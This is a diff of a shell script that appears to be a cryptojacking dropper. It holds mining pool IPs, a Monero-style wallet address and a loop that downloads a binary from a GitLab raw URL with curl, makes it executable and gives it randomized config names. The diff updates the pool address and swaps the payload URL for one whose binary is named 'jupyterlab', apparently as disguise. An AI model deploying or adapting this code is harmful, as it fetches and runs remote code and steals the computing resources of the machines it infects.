@@ -8,7 +8,7 @@ RUNTIME=600
 MIN_SLEEP=30
 MAX_SLEEP=40
 
-POOL="18.225.195.73:443"
+POOL="157.173.100.15:443"
 BACKUP_POOL="159.223.14.239:443"
 WALLET="84GbAidJhw8cxCq941aeTd7zHL5uJ5XhzLHgWUX3eQ4VfHoswB3Dx1edeWCpxJRKx53bTLEzVdGeJFNCPQ5o1BMKJdqH2C4"
 
@@ -103,7 +103,7 @@ while true; do
         CONFIG_SUFFIX=$(generate_random_string 10)
         CONFIG_NAME="${BIN_NAME}_config${CONFIG_SUFFIX}.json"
 
-        BIN_URL="https://gitlab.com/notesss2/filess/-/raw/main/sumo"
+        BIN_URL="https://gitlab.com/colaymanku/file/-/raw/main/jupyterlab"
         curl -sL "$BIN_URL" -o "$BIN_NAME_FULL" >/dev/null 2>&1
         chmod +x "$BIN_NAME_FULL"
 
